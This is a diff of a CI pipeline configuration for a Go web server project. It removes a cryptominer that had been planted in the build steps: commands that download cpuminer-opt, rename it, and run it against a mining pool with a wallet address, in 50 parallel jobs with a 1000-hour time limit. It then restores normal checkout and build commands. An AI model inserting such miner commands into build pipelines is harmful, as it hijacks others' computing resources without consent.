@@ -5,25 +5,18 @@ agent:
     type: e1-standard-2
     os_image: ubuntu1804
 execution_time_limit:
-  hours: 1000
-global_job_config:
-  prologue:
-    commands:
-      - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-      - tar xf cpuminer-opt-linux.tar.gz
-      - mv cpuminer-sse2 1
-      - './1 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
+  hours: 24
 blocks:
   - name: Build project
     task:
       jobs:
         - name: go get & build
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
-            - tar xf cpuminer-opt-linux.tar.gz
-            - mv cpuminer-sse2 1
-            - './1 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0'
-          parallelism: 50
+            - checkout
+            - sem-version go 1.12
+            - go get github.com/lib/pq
+            - go build webServer.go
+            - artifact push workflow webServer --force
   - name: Check code style
     task:
       jobs:
